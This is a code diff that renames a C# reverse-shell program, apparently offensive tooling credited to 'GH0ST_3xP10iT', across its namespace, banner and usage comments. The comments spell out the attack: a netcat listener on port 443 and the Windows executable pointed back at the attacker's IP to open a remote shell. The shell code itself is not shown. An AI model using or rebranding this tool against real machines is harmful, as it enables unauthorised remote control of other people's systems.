@@ -8,7 +8,7 @@ using System.Threading;
 using System.IO;
 using System.Diagnostics;
 
-namespace NativePayload_ReverseShell
+namespace 0xPayload_ReverseShell
 {
     class Program
     {
@@ -17,13 +17,13 @@ namespace NativePayload_ReverseShell
         static void Main(string[] args)
         {
 	    //// Step 1 (linux Side:192.168.56.1)   : nc -l -p 443 
-	    //// Step 2 (Windows Side:192.168.56.x) : NativePayload_ReverseShell.exe 192.168.0.1 443 
+	    //// Step 2 (Windows Side:192.168.56.x) : 0xPayload_ReverseShell.exe 192.168.0.1 443 
 
  	    Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.DarkGray;
-            Console.WriteLine("NativePayload_ReverseShell , Published by GH0ST_3xP10iT , 2019");
+            Console.WriteLine("0xPayload_ReverseShell , Published by GH0ST_3xP10iT , 2019");
             Console.ForegroundColor = ConsoleColor.Gray;
-            Console.WriteLine("NativePayload_ReverseShell , C# Managed Shell Code (Reverse Shell)");
+            Console.WriteLine("0xPayload_ReverseShell , C# Managed Shell Code (Reverse Shell)");
             Console.WriteLine();
 
             try
